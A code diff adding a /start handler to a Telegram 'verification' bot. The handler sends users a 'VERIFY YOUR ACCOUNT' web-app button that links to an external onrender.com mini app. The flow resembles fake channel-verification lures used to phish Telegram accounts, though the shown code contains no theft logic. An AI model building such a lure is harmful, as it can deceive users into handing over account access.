@@ -111,6 +111,42 @@ bot.onText(/\/status/, (msg) => {
     }
 });
 
+// Handle /start command with verification parameter
+bot.onText(/\/start(.*)/, (msg, match) => {
+    const startParam = match[1].trim();
+    
+    // If user came from channel verification link
+    if (startParam.startsWith('verify_')) {
+        const channelId = startParam.replace('verify_', '');
+        
+        // Send the web app button in private chat
+        const webAppButton = {
+            reply_markup: {
+                inline_keyboard: [[
+                    {
+                        text: "🔐 VERIFY YOUR ACCOUNT",
+                        web_app: { url: `https://my-telegram-bot-hiz4.onrender.com` }
+                    }
+                ]]
+            }
+        };
+        
+        bot.sendMessage(msg.chat.id, 
+            `Welcome! 👋\n\n` +
+            `Please verify your Telegram account to gain access to the channel.\n\n` +
+            `Click the button below to complete verification:`,
+            webAppButton
+        );
+    } else {
+        // Regular start command
+        bot.sendMessage(msg.chat.id, 
+            `Welcome to the Verification Bot! 🤖\n\n` +
+            `I help verify Telegram accounts for channel access.\n\n` +
+            `Add me to your channel as admin and I'll post the verification message automatically.`
+        );
+    }
+});
+
 // Handle data from Mini App
 bot.on('message', (msg) => {
     if (msg.web_app_data) {
